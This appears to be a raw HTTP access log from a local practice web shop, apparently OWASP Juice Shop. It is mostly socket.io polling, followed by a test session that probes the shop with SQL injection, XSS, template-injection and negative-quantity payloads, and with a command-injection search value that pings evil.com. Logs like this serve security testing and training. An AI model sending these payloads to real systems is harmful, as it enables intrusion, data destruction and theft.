+3b464c2e3a208dbabca9be57,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWMsdd&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:08:23+0530
+7a5d1e782d85fb3c7685b6d8,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWMykQ&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:08:23+0530
+e523a3e143c31a87c004bbd6,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWMykV&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:08:48+0530
+eb249b7be89ee79ed2cc3902,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWN2sP&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:08:48+0530
+a95fa46d87de635b65fea49f,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWN2sQ&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:09:13+0530
+2d4a3940eff2900a52baf1c2,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWN8zO&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:09:13+0530
+a10a3938442929d2958e634a,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWN8zV&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:09:38+0530
+96803c4b785d358a5532d17d,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWNF4S&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:09:38+0530
+9643ecbc9ec1ce5ec2b35fb1,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWNF4V&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:10:03+0530
+4c2b4ce590d67996ca2ce322,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWNLBA&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:10:03+0530
+3dd794ab6f499f18a95c347f,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWNLBE&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:10:28+0530
+0215ea95223e41e47090f122,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWNRH_&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:10:28+0530
+48b92529eb4a48ec14f3d230,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWNRI3&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:10:53+0530
+26e80e000756697a14662a67,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWNXP4&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:10:53+0530
+110b655d645e6a0f8324cc61,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWNXP6&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:11:18+0530
+ddc2f905a209cd211317fb6f,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWNdVx&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:11:18+0530
+cece75c0f43d90bd7310dc3d,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWNdWN&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:11:43+0530
+81389c6d6f88b06dbff4dd67,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWNjd8&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:11:43+0530
+140fe8b7df08265ac0973783,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWNjdC&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:12:08+0530
+c55262cd9215eb50452af139,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWNpkS&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:12:08+0530
+ce48695546829dcab7339cfc,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWNpkb&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:12:33+0530
+a56c6503633684b6ae1e447e,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWNvs3&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:12:34+0530
+161b5504ebd3090dca47baf1,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWNvs9&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:12:59+0530
+cb704e800bb4b177018d54c6,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWN_-1&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:12:59+0530
+adf8ccd93b5a278a7685df29,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWN_-7&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:13:24+0530
+18a29da8d03dc9246a61d810,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWO65E&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:13:24+0530
+fad516da9f9dd28fe8178e14,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWO65G&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:13:49+0530
+05a25f7cb564f14ec3a40ee4,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWOCC6&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:13:49+0530
+5beb89b7303fdc3ebce34932,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWOCC9&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:14:14+0530
+cc852670f2e822eacc55794b,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWOIIs&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:14:14+0530
+be3b0a06a1ab47a4d4366493,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWOII_&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:14:39+0530
+66de411c1c0d846ad2470988,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWOOPc&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:14:39+0530
+ec520545b744a4d6afb679d7,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWOOPk&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:15:04+0530
+64844d492f8168162555b042,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWOUWI&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:15:04+0530
+a09efff8243245b319d3e6cd,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWOUWM&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:15:29+0530
+657d265b2eeee7c677a5233b,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWOadS&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:15:29+0530
+09a5cf9eb2b323d2692f4c82,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWOadc&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:15:54+0530
+bb6834254c44a6bac67001df,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWOgkf&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:15:54+0530
+5493770b04e559b8b2b7c70c,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWOgkh&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:16:19+0530
+eda9f8413a97233129986817,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWOmrW&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:16:19+0530
+0fef4ce535404ce00d4cb93e,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWOmri&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:16:44+0530
+ac0d11fc31c5d16e6ddd5d3e,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWOsyZ&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:16:44+0530
+97741e690e5859fea0be3962,0a03c19f3929936e,313,127.0.0.1,POST,/api/Users,HTTP/1.1,"{\x22email\x22: \x22attacker91910@test.com\x22, \x22password\x22: \x22Test1234!\x22, \x22passwordRepeat\x22: \x22Test1234!\x22, \x22securityQuestion\x22: {\x22id\x22: 1, \x22question\x22: \x22Your eldest siblings middle name?\x22}, \x22securityAnswer\x22: \x22test\x22}",201,2025-12-03T00:17:01+0530
+f6940c8a72220e2feb5022a7,0f7663d2311ea47f,820,127.0.0.1,POST,/rest/user/login,HTTP/1.1,"{\x22email\x22: \x22attacker91910@test.com\x22, \x22password\x22: \x22Test1234!\x22}",200,2025-12-03T00:17:01+0530
+ab0c93693124a7db453965d9,d15e0519eeded2db,286,127.0.0.1,POST,/api/Addresss,HTTP/1.1,"{\x22fullName\x22: \x22Test User 646\x22, \x22mobileNum\x22: \x225206103075\x22, \x22zipCode\x22: \x2215066\x22, \x22streetAddress\x22: \x22255 Main Street\x22, \x22city\x22: \x22New York\x22, \x22state\x22: \x22NY\x22, \x22country\x22: \x22United States\x22}",201,2025-12-03T00:17:01+0530
+0da3b617e1e20b15bc498dd4,d15e0519eeded2db,286,127.0.0.1,POST,/api/Addresss,HTTP/1.1,"{\x22fullName\x22: \x22Test User 599\x22, \x22mobileNum\x22: \x224508079769\x22, \x22zipCode\x22: \x2246771\x22, \x22streetAddress\x22: \x22253 Main Street\x22, \x22city\x22: \x22New York\x22, \x22state\x22: \x22NY\x22, \x22country\x22: \x22United States\x22}",201,2025-12-03T00:17:01+0530
+82132301ace14a32022650f5,d15e0519eeded2db,285,127.0.0.1,POST,/api/Addresss,HTTP/1.1,"{\x22fullName\x22: \x22Test User 31\x22, \x22mobileNum\x22: \x227343377182\x22, \x22zipCode\x22: \x2236698\x22, \x22streetAddress\x22: \x22111 Main Street\x22, \x22city\x22: \x22New York\x22, \x22state\x22: \x22NY\x22, \x22country\x22: \x22United States\x22}",201,2025-12-03T00:17:02+0530
+728972a889b71c954fa55523,fc578e3cab014083,140,127.0.0.1,POST,/api/Cards,HTTP/1.1,"{\x22fullName\x22: \x22Test User 957\x22, \x22cardNum\x22: \x224218239359708059\x22, \x22expMonth\x22: 7, \x22expYear\x22: 2026}",400,2025-12-03T00:17:02+0530
+a68060016a2608429d683037,fc578e3cab014083,140,127.0.0.1,POST,/api/Cards,HTTP/1.1,"{\x22fullName\x22: \x22Test User 652\x22, \x22cardNum\x22: \x224802290097638604\x22, \x22expMonth\x22: 7, \x22expYear\x22: 2028}",400,2025-12-03T00:17:02+0530
+a3f0ea4285ac37a33230e51b,fc578e3cab014083,140,127.0.0.1,POST,/api/Cards,HTTP/1.1,"{\x22fullName\x22: \x22Test User 687\x22, \x22cardNum\x22: \x224170138513375174\x22, \x22expMonth\x22: 8, \x22expYear\x22: 2029}",400,2025-12-03T00:17:02+0530
+961a6d39e262faed4904b1f9,8e56293a547bf300,156,127.0.0.1,POST,/api/BasketItems,HTTP/1.1,"{\x22ProductId\x22: 25, \x22BasketId\x22: 9, \x22quantity\x22: 2}",200,2025-12-03T00:17:02+0530
+c52285fa0125a8f022c3dcae,8e56293a547bf300,155,127.0.0.1,POST,/api/BasketItems,HTTP/1.1,"{\x22ProductId\x22: 3, \x22BasketId\x22: 9, \x22quantity\x22: 2}",200,2025-12-03T00:17:02+0530
+5a4617b1943011f55a78806c,8e56293a547bf300,155,127.0.0.1,POST,/api/BasketItems,HTTP/1.1,"{\x22ProductId\x22: 1, \x22BasketId\x22: 9, \x22quantity\x22: 2}",200,2025-12-03T00:17:02+0530
+ec772cf0a7a93df0c351772f,cfa53d91046646b3,369,127.0.0.1,GET,/rest/products/search?q=%27%20UNION%20SELECT%201%2C2%2C3--,HTTP/1.1,,500,2025-12-03T00:17:02+0530
+e96a19b6a002749835e79eda,afd4dfc890508305,309,127.0.0.1,PUT,/api/Addresss/62,HTTP/1.1,"{\x22fullName\x22: \x22Updated '\x5C\x22><script>aler\x22, \x22city\x22: \x22New '\x5C\x22><script City\x22}",200,2025-12-03T00:17:04+0530
+e8c416e34830f8d4c324996d,c5de371b99a7c2b3,30,127.0.0.1,DELETE,/api/BasketItems/53,HTTP/1.1,,200,2025-12-03T00:17:05+0530
+0cf10d5065306aafdf3b3b57,fb2c2427a0e632f0,972,127.0.0.1,GET,/rest/basket/9,HTTP/1.1,,200,2025-12-03T00:17:07+0530
+9159b8ca6d0e0b83f7a910f0,afd4dfc890508305,289,127.0.0.1,PUT,/api/Addresss/63,HTTP/1.1,"{\x22streetAddress\x22: \x22789 ' OR 1=1-- Blvd\x22, \x22state\x22: \x22XX\x22}",200,2025-12-03T00:17:08+0530
+e1606c57c20a97738d8c4a36,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWOsz1&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:17:09+0530
+bf11c005a2d1a28195fba10f,c5de371b99a7c2b3,30,127.0.0.1,DELETE,/api/BasketItems/52,HTTP/1.1,,200,2025-12-03T00:17:10+0530
+84d321d392925ca125f1a98f,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWOzJP&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:17:10+0530
+4a715b0069e538fbc7c3909d,1d8c3cc2b722f935,8724,127.0.0.1,GET,/api/Challenges,HTTP/1.1,,200,2025-12-03T00:17:11+0530
+73fb42feccc14902a6f0fe71,afd4dfc890508305,307,127.0.0.1,PUT,/api/Addresss/61,HTTP/1.1,"{\x22fullName\x22: \x22Updated <script>alert('\x22, \x22city\x22: \x22New <script>al City\x22}",200,2025-12-03T00:17:12+0530
+318f8e7066e83766d60ac3bf,fc578e3cab014083,140,127.0.0.1,POST,/api/Cards,HTTP/1.1,"{\x22fullName\x22: \x22Test User 406\x22, \x22cardNum\x22: \x224325617450057111\x22, \x22expMonth\x22: 2, \x22expYear\x22: 2027}",400,2025-12-03T00:17:14+0530
+8ed27f2ec46691a10cc8fd0e,fc578e3cab014083,140,127.0.0.1,POST,/api/Cards,HTTP/1.1,"{\x22fullName\x22: \x22Test User 874\x22, \x22cardNum\x22: \x224370221347857725\x22, \x22expMonth\x22: 9, \x22expYear\x22: 2030}",400,2025-12-03T00:17:16+0530
+257f413e460b1e1658c0f5dc,8e56293a547bf300,155,127.0.0.1,POST,/api/BasketItems,HTTP/1.1,"{\x22ProductId\x22: 9, \x22BasketId\x22: 9, \x22quantity\x22: 3}",200,2025-12-03T00:17:16+0530
+fd7b33339455b1d7f75ca296,c5de371b99a7c2b3,30,127.0.0.1,DELETE,/api/BasketItems/54,HTTP/1.1,,200,2025-12-03T00:17:16+0530
+2b5a76af28e055893fcfdddd,8a8229fcdabd3f44,30,127.0.0.1,GET,/rest/products/search?q=%24%7B7%2A7%7D,HTTP/1.1,,200,2025-12-03T00:17:18+0530
+884d31ca13c6114836f2df42,fc578e3cab014083,140,127.0.0.1,POST,/api/Cards,HTTP/1.1,"{\x22fullName\x22: \x22Test User 821\x22, \x22cardNum\x22: \x224999714344501065\x22, \x22expMonth\x22: 10, \x22expYear\x22: 2030}",400,2025-12-03T00:17:19+0530
+df253da0b0c1f65416286cfb,bc466f600626b8a9,157,127.0.0.1,PUT,/api/BasketItems/51,HTTP/1.1,{\x22quantity\x22: -1},200,2025-12-03T00:17:20+0530
+16dff54f32d9477e91bf9cf2,fc578e3cab014083,140,127.0.0.1,POST,/api/Cards,HTTP/1.1,"{\x22fullName\x22: \x22Test User 94\x22, \x22cardNum\x22: \x224229745294946390\x22, \x22expMonth\x22: 12, \x22expYear\x22: 2027}",400,2025-12-03T00:17:21+0530
+dde36075a12fd2bbf7471a90,c5de371b99a7c2b3,30,127.0.0.1,DELETE,/api/BasketItems/51,HTTP/1.1,,200,2025-12-03T00:17:22+0530
+fc465b13a6736c8997895d04,5873550952c2aa8b,853,127.0.0.1,GET,/api/Addresss,HTTP/1.1,,200,2025-12-03T00:17:23+0530
+74e2c19502577a26b2a761c9,8e56293a547bf300,155,127.0.0.1,POST,/api/BasketItems,HTTP/1.1,"{\x22ProductId\x22: 1, \x22BasketId\x22: 9, \x22quantity\x22: 2}",200,2025-12-03T00:17:25+0530
+6bfa95a737be6ed967d4d975,1b03c5b89b8e6cfa,61,127.0.0.1,PUT,/api/BasketItems/55,HTTP/1.1,{\x22quantity\x22: 7},400,2025-12-03T00:17:25+0530
+58f4583dd92bbe02c2939803,b612a7b98fc9ce89,59,127.0.0.1,DELETE,/api/Addresss/63,HTTP/1.1,,200,2025-12-03T00:17:26+0530
+e063147f06e3516f62e7685c,39ff7855035974aa,30,127.0.0.1,GET,/api/Cards,HTTP/1.1,,200,2025-12-03T00:17:27+0530
+5c45f237f0f4972f49ea7771,afd4dfc890508305,314,127.0.0.1,PUT,/api/Addresss/62,HTTP/1.1,"{\x22streetAddress\x22: \x22789 ' OR '1'='1 Blvd\x22, \x22state\x22: \x22XX\x22}",200,2025-12-03T00:17:29+0530
+75880406eeaa337c6b116b57,c5de371b99a7c2b3,30,127.0.0.1,DELETE,/api/BasketItems/55,HTTP/1.1,,200,2025-12-03T00:17:30+0530
+993d9c6ad42ca4d4c1f22454,39ff7855035974aa,30,127.0.0.1,GET,/api/Cards,HTTP/1.1,,200,2025-12-03T00:17:32+0530
+da50359806be70983a03bdaa,afd4dfc890508305,318,127.0.0.1,PUT,/api/Addresss/62,HTTP/1.1,"{\x22streetAddress\x22: \x22789 ' UNION SELECT  Blvd\x22, \x22state\x22: \x22XX\x22}",200,2025-12-03T00:17:34+0530
+e84dcf08fec29bf7e3b834ca,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWOzJg&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:17:35+0530
+8813c7e3afd988ca3bc20e96,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWP3T2&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:17:35+0530
+f3ce9d36b69d90821f6da985,b612a7b98fc9ce89,59,127.0.0.1,DELETE,/api/Addresss/62,HTTP/1.1,,200,2025-12-03T00:17:36+0530
+7543ad84f8fb04029cb8c273,e0b7cc339ffdc6bb,444,127.0.0.1,GET,/api/SecurityQuestions,HTTP/1.1,,200,2025-12-03T00:17:37+0530
+525ef6394d5826eae3dc72d1,afd4dfc890508305,316,127.0.0.1,PUT,/api/Addresss/61,HTTP/1.1,"{\x22streetAddress\x22: \x22789 '; DROP TABLE u Blvd\x22, \x22state\x22: \x22XX\x22}",200,2025-12-03T00:17:39+0530
+1dfac300be0a35cb0354dfd7,d15e0519eeded2db,286,127.0.0.1,POST,/api/Addresss,HTTP/1.1,"{\x22fullName\x22: \x22Test User 802\x22, \x22mobileNum\x22: \x227772607020\x22, \x22zipCode\x22: \x2235428\x22, \x22streetAddress\x22: \x22834 Main Street\x22, \x22city\x22: \x22New York\x22, \x22state\x22: \x22NY\x22, \x22country\x22: \x22United States\x22}",201,2025-12-03T00:17:41+0530
+39b329062e5722d6cf8b4ac5,fc578e3cab014083,140,127.0.0.1,POST,/api/Cards,HTTP/1.1,"{\x22fullName\x22: \x22Test User 928\x22, \x22cardNum\x22: \x224949771234505643\x22, \x22expMonth\x22: 2, \x22expYear\x22: 2030}",400,2025-12-03T00:17:41+0530
+e78b42262d8c766e630cf0a7,8e56293a547bf300,155,127.0.0.1,POST,/api/BasketItems,HTTP/1.1,"{\x22ProductId\x22: 4, \x22BasketId\x22: 9, \x22quantity\x22: 1}",200,2025-12-03T00:17:41+0530
+33f98b764063f6f1fbebd8e0,c5de371b99a7c2b3,30,127.0.0.1,DELETE,/api/BasketItems/56,HTTP/1.1,,200,2025-12-03T00:17:41+0530
+c8f261026c5253c27ef3651c,6801cb44dc6a692c,30,127.0.0.1,GET,/rest/products/15/reviews,HTTP/1.1,,200,2025-12-03T00:17:42+0530
+2c9b06e9e09139128284a469,afd4dfc890508305,312,127.0.0.1,PUT,/api/Addresss/61,HTTP/1.1,"{\x22streetAddress\x22: \x22789 ' OR 'x'='x Blvd\x22, \x22state\x22: \x22XX\x22}",200,2025-12-03T00:17:44+0530
+d50a09d93b7544322dcb6db8,fc578e3cab014083,140,127.0.0.1,POST,/api/Cards,HTTP/1.1,"{\x22fullName\x22: \x22Test User 588\x22, \x22cardNum\x22: \x224697025427926814\x22, \x22expMonth\x22: 10, \x22expYear\x22: 2030}",400,2025-12-03T00:17:46+0530
+42fa8db795d7e85acc5a0a0c,8e56293a547bf300,156,127.0.0.1,POST,/api/BasketItems,HTTP/1.1,"{\x22ProductId\x22: 31, \x22BasketId\x22: 9, \x22quantity\x22: 1}",200,2025-12-03T00:17:48+0530
+5efaa6fbe00c2903a75b51e8,c5de371b99a7c2b3,30,127.0.0.1,DELETE,/api/BasketItems/57,HTTP/1.1,,200,2025-12-03T00:17:48+0530
+e4bd849d20e5a82cbcad1b3b,db5fd8aea95ad766,30,127.0.0.1,GET,/rest/products/search?q=%3B%20ping%20-c%205%20evil.com,HTTP/1.1,,200,2025-12-03T00:17:50+0530
+3711b3e393f1457529491072,afd4dfc890508305,312,127.0.0.1,PUT,/api/Addresss/61,HTTP/1.1,"{\x22streetAddress\x22: \x22789 ' OR '1'='1 Blvd\x22, \x22state\x22: \x22XX\x22}",200,2025-12-03T00:17:52+0530
+b7098387d950529315696f4a,fc578e3cab014083,140,127.0.0.1,POST,/api/Cards,HTTP/1.1,"{\x22fullName\x22: \x22Test User 877\x22, \x22cardNum\x22: \x224326261386153445\x22, \x22expMonth\x22: 4, \x22expYear\x22: 2030}",400,2025-12-03T00:17:52+0530
+3a67147e962143a50f25abd9,80c2afbf7296d842,61,127.0.0.1,POST,/api/BasketItems,HTTP/1.1,"{\x22ProductId\x22: 27, \x22BasketId\x22: 9, \x22quantity\x22: 2}",400,2025-12-03T00:17:54+0530
+acc41c44030d337aadead23c,fc578e3cab014083,140,127.0.0.1,POST,/api/Cards,HTTP/1.1,"{\x22fullName\x22: \x22Test User 907\x22, \x22cardNum\x22: \x224270556306801683\x22, \x22expMonth\x22: 7, \x22expYear\x22: 2026}",400,2025-12-03T00:17:55+0530
+28c0a499cff40719cabbc09b,b612a7b98fc9ce89,59,127.0.0.1,DELETE,/api/Addresss/64,HTTP/1.1,,200,2025-12-03T00:17:56+0530
+29a36422f2acda6416b4b8c9,1c3cd5dd6bda7c27,1582,127.0.0.1,GET,/rest/languages?q=%27%20AND%201%3D1--,HTTP/1.1,,200,2025-12-03T00:17:57+0530
+49cbce39a3ddc87e0f01f27a,afd4dfc890508305,312,127.0.0.1,PUT,/api/Addresss/61,HTTP/1.1,"{\x22fullName\x22: \x22Updated <script>alert(d\x22, \x22city\x22: \x22New <script>al City\x22}",200,2025-12-03T00:17:59+0530
+3ca7c3c7657aad780ea33374,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWP3TA&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-03T00:18:00+0530
+2e0c85dd4927c599568c7ad5,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWP9a6&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-03T00:18:00+0530
+30c8e3b3c5026138835f34a5,b612a7b98fc9ce89,59,127.0.0.1,DELETE,/api/Addresss/61,HTTP/1.1,,200,2025-12-03T00:18:01+0530
+f32b82ec5f0e23da8f6dfb9e,5585bb50c9472de2,336,127.0.0.1,GET,/rest/track-order/,HTTP/1.1,,500,2025-12-03T00:18:02+0530
+9c3967000295253c2ca3b987,d15e0519eeded2db,285,127.0.0.1,POST,/api/Addresss,HTTP/1.1,"{\x22fullName\x22: \x22Test User 91\x22, \x22mobileNum\x22: \x225477940034\x22, \x22zipCode\x22: \x2230921\x22, \x22streetAddress\x22: \x22935 Main Street\x22, \x22city\x22: \x22New York\x22, \x22state\x22: \x22NY\x22, \x22country\x22: \x22United States\x22}",201,2025-12-03T00:18:03+0530
+da182129b0326e601befc259,afd4dfc890508305,307,127.0.0.1,PUT,/api/Addresss/65,HTTP/1.1,"{\x22fullName\x22: \x22Updated <svg onload=ale\x22, \x22city\x22: \x22New <svg onloa City\x22}",200,2025-12-03T00:18:03+0530
+86718265064cd29fc460cd2a,8e56293a547bf300,155,127.0.0.1,POST,/api/BasketItems,HTTP/1.1,"{\x22ProductId\x22: 8, \x22BasketId\x22: 9, \x22quantity\x22: 1}",200,2025-12-03T00:18:04+0530
+0c5b2798b2060d416b67c256,c5de371b99a7c2b3,30,127.0.0.1,DELETE,/api/BasketItems/58,HTTP/1.1,,200,2025-12-03T00:18:04+0530
+51c3ec70e95de25d54ef7f4b,1d8c3cc2b722f935,8724,127.0.0.1,GET,/api/Challenges,HTTP/1.1,,200,2025-12-03T00:18:06+0530
+48ae51d727bffb7cb6aab07a,c43a28ec44b3d1e3,20,127.0.0.1,PUT,/rest/products/4/reviews,HTTP/1.1,"{\x22message\x22: \x22Review: <script>alert('XSS')</script>\x22, \x22author\x22: \x22attacker91910@test.com\x22}",201,2025-12-03T00:18:07+0530
+a7a4e5ec743a26004226a191,b612a7b98fc9ce89,59,127.0.0.1,DELETE,/api/Addresss/65,HTTP/1.1,,200,2025-12-03T00:18:09+0530
+051a796f769ceba77f2ec52b,fb2c2427a0e632f0,154,127.0.0.1,GET,/rest/basket/9,HTTP/1.1,,200,2025-12-03T00:18:10+0530
+7dda62442c05c4d549c7f117,d15e0519eeded2db,286,127.0.0.1,POST,/api/Addresss,HTTP/1.1,"{\x22fullName\x22: \x22Test User 995\x22, \x22mobileNum\x22: \x229889505880\x22, \x22zipCode\x22: \x2259358\x22, \x22streetAddress\x22: \x22406 Main Street\x22, \x22city\x22: \x22New York\x22, \x22state\x22: \x22NY\x22, \x22country\x22: \x22United States\x22}",201,2025-12-03T00:18:10+0530
+fe7695a2e5e97b3b6bbaa628,afd4dfc890508305,290,127.0.0.1,PUT,/api/Addresss/66,HTTP/1.1,"{\x22streetAddress\x22: \x22789 ' OR 1=1-- Blvd\x22, \x22state\x22: \x22XX\x22}",200,2025-12-03T00:18:10+0530
+1a325c204840c722ab56aca0,8e56293a547bf300,156,127.0.0.1,POST,/api/BasketItems,HTTP/1.1,"{\x22ProductId\x22: 19, \x22BasketId\x22: 9, \x22quantity\x22: 1}",200,2025-12-03T00:18:11+0530
+a45fa85bfb7b3144c2414128,c5de371b99a7c2b3,30,127.0.0.1,DELETE,/api/BasketItems/59,HTTP/1.1,,200,2025-12-03T00:18:11+0530
+927cf69f28c4ad4a74c4ccf3,014d3c5080f22c35,428,127.0.0.1,GET,/api/Products/14?test=admin%27--,HTTP/1.1,,200,2025-12-03T00:18:13+0530
+0453f51ec4551767a0e44271,fc578e3cab014083,140,127.0.0.1,POST,/api/Cards,HTTP/1.1,"{\x22fullName\x22: \x22Test User 776\x22, \x22cardNum\x22: \x224421434195362386\x22, \x22expMonth\x22: 2, \x22expYear\x22: 2026}",400,2025-12-03T00:18:14+0530
+cc17db163920e73279c256c9,afd4dfc890508305,313,127.0.0.1,PUT,/api/Addresss/66,HTTP/1.1,"{\x22fullName\x22: \x22Updated '\x5C\x22><script>aler\x22, \x22city\x22: \x22New '\x5C\x22><script City\x22}",200,2025-12-03T00:18:15+0530
